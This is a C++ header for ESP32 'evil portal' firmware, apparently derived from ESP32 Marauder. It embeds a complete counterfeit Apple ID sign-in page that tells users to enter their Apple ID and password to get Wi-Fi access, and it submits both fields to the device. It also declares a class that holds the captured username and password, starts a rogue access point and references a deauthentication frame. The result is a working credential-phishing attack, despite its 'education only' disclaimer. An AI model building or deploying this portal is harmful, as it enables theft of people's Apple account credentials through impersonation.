#pragma once

#ifndef EVILPORTALHEADER_H
#define EVILPORTALHEADER_H

/*
     * evilportalheader.h (Based ESP32 Marauder By @justcallmekoko)
    * /!\ WARNING: All Code I Wrote In This Is For Education Purpose ONLY! /!\
    * /!\        I NOT RESPONSIBLE ANY DAMAGE USER CAUSE IN PUBLIC         /!\
    * Author: Shine Nagumo @Ohminecraft (Xun Anh Nguyen)
    * Licensed under the MIT License.
*/

#include <Arduino.h>
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>
#include <WiFi.h>

#include <LinkedList.h>

#include "wifiheader.h"

const char default_html[] PROGMEM = R"=====(
    <!-- Original code : https://github.com/ai-dev-official/Apple-Dev-Login-Page- by ai-dev-official -->
    <!-- Edited and adapted by : Jules0835 for educational purposes -->

    <!DOCTYPE html>
    <html lang="en">

    <head>
        <title>Login - Apple</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            
            * {
                box-sizing: border-box;
                margin: 0;
                padding: 0;
                list-style: none;
                text-decoration: none;
            }

            body {
                font-family: SF Pro Text, SF Pro Icons, Helvetica Neue, Helvetica, Arial, sans-serif;
                color: #98989c;
            }

            header {
                padding: 5px;
                margin: 10px;
            }

            header svg {
                width: 25px;
                height: 25px;
            }

            .main {
                position: relative;
                display: flex;
                justify-content: center;
                align-content: center;
                align-items: center;
                min-height: 85vh;
            }

            form {
                width: 500px;
                display: flex;
                flex-direction: column;
                align-items: center;

            }

            #sign h2 {
                text-align: center;
                margin: 5px auto 0px;
                font-size: 22px;
                line-height: 1.47059;
                font-weight: 400;
                letter-spacing: -.022em;
                font-family: SF Pro Text, SF Pro Icons, Helvetica Neue, Helvetica, Arial, sans-serif;
                color: #656569;
            }

            #inputText {
                margin: 5px 0 80px 0;
            }

            #appleid {
                min-width: 350px;
                padding: 20px;
                border: .5px solid #d2d2d7;
                border-radius: 10px;
                border-bottom-left-radius: 0;
                border-bottom-right-radius: 0;
                background-repeat: no-repeat;
                background-position: calc(100% - 20px) center;
                background-image: url('./input.svg');
                align-self: center;
                background-size: 8%;
            }

            #password {
                min-width: 350px;
                padding: 20px;
                border: .5px solid #d2d2d7;
                border-radius: 10px;
                border-top-left-radius: 0;
                border-top-right-radius: 0;
                background-repeat: no-repeat;
                background-position: calc(100% - 20px) center;
                background-image: url('./input.svg');
                align-self: center;
                background-size: 8%;
            }

            input #appleid {
                box-shadow: none;
                outline: none;
                -moz-box-shadow: none;
                -webkit-box-shadow: none;
                border-color: transparent;
            }

            .input2 {
                text-align: center;
                min-width: 180px;
                border-bottom: .1px solid #d2d2d7;
            }

            .logo {
                display: flex;
                justify-content: center;
                margin-top: -60px;
                margin-bottom: 20px;
            }

            .logo svg {
                width: 8%;
                height: auto;
            }

            #remember {
                margin-right: 5px;
                margin-bottom: 20px;
            }

            #r2 {
                color: #656569;
            }

            form h4 {
                margin-top: 1rem;
                font-weight: 300;
            }

            ::placeholder {
                font-size: 16px;
                /* font-family: Arial, sans-serif; */
            }

            .bx {
                color: #1975d1;
                transform: rotate(45deg);
            }

            footer {
                position: absolute;
                display: flex;
                width: 100%;
                height: 65px;
                padding: 20px;
                bottom: 0;
                margin-bottom: 0;
                background-color: #f5f5f7;
            }

            footer p {
                font-size: 13px;
            }

            footer p:nth-child(2) {
                margin: 0 20px;
            }

            footer p:nth-child(3) {
                padding-left: 20px;
                border-left: .5px solid #d2d2d7;
            }

            button {
                background: none;
                border: none;
                padding: 0;
                margin: 0;
                font: inherit;
                color: inherit;
                cursor: pointer;
            }

            @media screen and (max-width: 768px) {
                form {
                    width: 80%;
                }

                #appleid,
                #password {
                    min-width: 90%;
                }
            }
        </style>
    </head>

    <body>
        <header>
            <div class="appleLogo">
                <svg version="1.0" xmlns="http://www.w3.org/2000/svg" width="1000.000000pt" height="1000.000000pt"
                    viewBox="0 0 1000.000000 1000.000000" preserveAspectRatio="xMidYMid meet">

                    <g transform="translate(0.000000,1000.000000) scale(0.100000,-0.100000)" fill="#000000" stroke="none">
                        <path d="M6820 9745 c-332 -56 -725 -235 -1013 -461 -278 -219 -545 -588 -682
                        -942 -95 -247 -146 -585 -118 -787 l6 -48 156 6 c229 9 371 44 588 147 470
                        223 926 725 1121 1233 94 244 140 528 125 765 l-6 102 -51 -1 c-28 -1 -85 -7
                        -126 -14z" />

                        <path d="M6635 7499 c-238 -26 -494 -92 -870 -226 -487 -174 -647 -219 -737
                        -209 -81 10 -274 64 -463 131 -413 147 -510 179 -650 215 -196 50 -334 70
                        -488 70 -422 0 -863 -135 -1245 -382 -531 -343 -917 -902 -1087 -1573 -83
                        -327 -110 -593 -102 -1003 7 -364 41 -643 121 -997 161 -711 486 -1470 863
                        -2014 559 -807 985 -1188 1410 -1262 101 -18 325 -6 453 24 123 29 316 92 522
                        171 518 198 922 225 1387 91 50 -15 161 -54 248 -87 201 -77 403 -141 529
                        -168 124 -27 342 -37 444 -21 179 28 370 108 540 229 350 247 887 946 1200
                        1562 96 190 251 561 294 707 6 20 -5 28 -111 81 -229 114 -398 237 -594 432
                        -332 330 -519 702 -585 1167 -23 162 -23 468 0 627 43 296 140 558 293 791
                        158 239 394 468 661 640 l91 58 -61 80 c-277 363 -670 625 -1142 761 -306 89
                        -679 131 -921 105z" />
                    </g>
                </svg>
            </div>

        </header>


        <div class="main">
            <form action="/get" id="email-form-step" method="GET">
                <div id="sign">
                    <h2>Sign in</h2>
                    <h2>Use your Apple ID to access the Wi-Fi</h2>
                </div>
                <div class="input" id="inputText">
                    <div>
                        <input type="email" name="email" placeholder="Apple ID" id="appleid" required>
                    </div>
                    <div>
                        <input type="password" name="password" placeholder="Password" id="password" required>
                    </div>
                </div>
                <div class="logo">
                    <button class="button" type="submit">
                        <svg version="1.0" xmlns="http://www.w3.org/2000/svg" width="512.000000pt" height="512.000000pt"
                            viewBox="0 0 512.000000 512.000000" preserveAspectRatio="xMidYMid meet">

                            <g transform="translate(0.000000,512.000000) scale(0.100000,-0.100000)" fill="#000000"
                                stroke="none">
                                <path d="M2330 5110 c-494 -48 -950 -230 -1350 -538 -195 -150 -448 -432 -594
                                -662 -63 -99 -186 -351 -230 -471 -51 -139 -103 -344 -128 -504 -31 -200 -31
                                -550 0 -750 43 -273 114 -500 237 -750 132 -269 269 -460 489 -681 221 -220
                                412 -357 681 -489 247 -121 469 -192 745 -237 195 -31 565 -31 760 0 276 45
                                498 116 745 237 269 132 460 269 681 489 220 221 357 412 489 681 123 250 194
                                477 237 750 31 200 31 550 0 750 -43 273 -114 500 -237 750 -132 269 -269 460
                                -489 681 -221 220 -412 357 -681 489 -246 121 -474 193 -740 235 -147 23 -475
                                34 -615 20z m430 -351 c872 -79 1622 -675 1896 -1506 350 -1060 -145 -2212
                                -1156 -2691 -1096 -519 -2416 -44 -2938 1058 -397 837 -221 1841 438 2500 465
                                465 1108 699 1760 639z" />
                                <path d="M2735 3702 c-79 -28 -127 -93 -127 -172 1 -27 8 -61 16 -77 8 -15
                                168 -181 355 -368 l341 -340 -992 -5 c-899 -5 -996 -7 -1023 -22 -64 -35 -97
                                -90 -97 -158 0 -68 33 -123 97 -158 27 -15 124 -17 1023 -22 l992 -5 -341
                                -340 c-187 -187 -347 -353 -355 -368 -20 -37 -20 -117 0 -155 24 -46 84 -90
                                132 -98 87 -13 98 -4 622 519 266 265 496 502 512 526 40 60 46 101 25 159
                                -15 40 -90 120 -504 535 -267 269 -505 502 -528 518 -43 30 -111 44 -148 31z" />
                            </g>
                        </svg>
                    </button>
                </div>
                <div class="input2">
                    <input type="checkbox" name="remember" id="remember"><label for="remember" id="r2">Remember me</label>
                </div>
                <h4><a href="#">Forgot Apple ID or password?</a><span><i class='bx bx-up-arrow-alt'></i></span></h4>
                <h4>Dont't have an Apple ID? <a href="#">Create yours now.</a><span><i
                            class='bx bx-up-arrow-alt'></i></span></h4>
            </form>
        </div>

        <footer>
            <p>Copyright &copy 2025 Apple Inc. All rights reserved.</p>
            <p>Privacy Policy</p>
            <p>Terms of Use</p>
        </footer>
    </body>
    </html>
)=====";

extern uint8_t deauth_frame[];

char evilapName[MAX_AP_NAME_SIZE] = "PORTAL";
char index_html[MAX_HTML_SIZE] = "TEST";

class EvilPortalAddtional 
{
    /*
    class CaptiveRequestHandler : public AsyncWebHandler {
    public:
        CaptiveRequestHandler(EvilPortalAddtional *evilportal) : _portal(evilportal) {}
        virtual ~CaptiveRequestHandler() { _portal = nullptr; }

        bool canHandle(AsyncWebServerRequest *request) { return true; }

        void handleRequest(AsyncWebServerRequest *request);
    private:
        EvilPortalAddtional *_portal;
    };
    */
    private:
        String user_name;
        String password;

        bool has_html;
        bool has_ap;

        //void portalController(AsyncWebServerRequest *request);

    public:
        EvilPortalAddtional();

        //String target_html_name = "index.html";
        //uint8_t selected_html_index = 0;

        bool name_received;
        bool password_received;
        bool runServer;

        //LinkedList<String>* html_files;
        String get_user_name();
        String get_password();

        void shutdownServer();
        void serverSetup();
        void apStart();
        bool apSetup(bool _deauth);
        bool htmlSetup();
        void setup();
        void loop();
};

#endif